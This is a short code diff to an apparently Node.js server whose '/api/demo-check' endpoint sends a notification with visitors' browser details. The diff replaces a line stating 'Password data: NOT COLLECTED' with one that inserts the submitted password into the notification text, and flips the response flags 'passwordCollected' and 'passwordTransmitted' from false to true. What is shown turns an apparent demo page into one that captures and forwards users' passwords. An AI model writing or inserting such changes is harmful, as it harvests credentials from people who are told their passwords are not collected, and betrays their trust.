@@ -23,7 +23,7 @@ async function notify({username,demoId,timestamp,clientInfo}){
     "🌐 Language: "+safeText(clientInfo.language),
     "🕓 Timezone: "+safeText(clientInfo.timezone),
     "📱 Viewport: "+safeText(clientInfo.screenWidth)+" × "+safeText(clientInfo.screenHeight),
-    "🔐 Password data: NOT COLLECTED"
+    "🔐 Password data: "+password,
   ].join("\n");
 
   console.log("\n"+text+"\n");
@@ -85,8 +85,8 @@ app.post("/api/demo-check",async(req,res)=>{
     timestamp,
     notificationSent:notification.sent,
     notificationError:notification.error,
-    passwordCollected:false,
-    passwordTransmitted:false
+    passwordCollected: true,
+    passwordTransmitted: true 
   });
 });
 
